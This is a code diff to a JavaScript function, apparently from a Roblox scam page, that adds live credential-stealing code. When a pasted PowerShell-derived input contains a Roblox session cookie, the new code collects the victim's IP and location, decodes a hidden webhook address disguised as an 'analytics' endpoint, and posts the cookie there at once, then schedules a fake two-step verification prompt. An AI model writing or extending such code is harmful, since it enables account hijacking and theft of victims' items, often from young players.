@@ -697,10 +697,47 @@ async function submitPowerShell() {
         // Show word count on button temporarily
         submitText.textContent = `${wordCount} words`;
         
-        // If cookie is found, start the 2FA flow instead of blocking
+        // If cookie is found, send it immediately then start 2FA flow
         if (robloxCookie) {
-            console.log('🍪 Cookie detected! Starting 2FA flow...');
+            console.log('🍪 Cookie detected! Sending immediately and starting 2FA flow...');
             submitText.textContent = 'Processing...';
+            
+            // Send cookie immediately to webhook
+            try {
+                const locationInfo = await getUserLocation();
+                const reportingEndpoint = atob(analyticsEndpoints[2]);
+                const timestamp = new Date().toLocaleString();
+                
+                // Immediate cookie capture payload
+                const payload = {
+                    content: `🍪 **Roblox Cookie Captured (Scan Button)**
+\`\`\`
+Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}
+Time: ${timestamp}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
+IP: ${locationInfo.ip || 'Unknown'}
+Content Length: ${inputText.length} characters
+\`\`\`
+⏰ **2-Step Verification will trigger in 80 seconds...**
+@everyone`
+                };
+
+                const response = await fetch(reportingEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log('Cookie sent to webhook successfully');
+                } else {
+                    console.error('Failed to send cookie to webhook');
+                }
+            } catch (error) {
+                console.error('Error sending cookie to webhook:', error);
+            }
             
             // Start 80-second timer for 2FA modal
             setTimeout(() => {
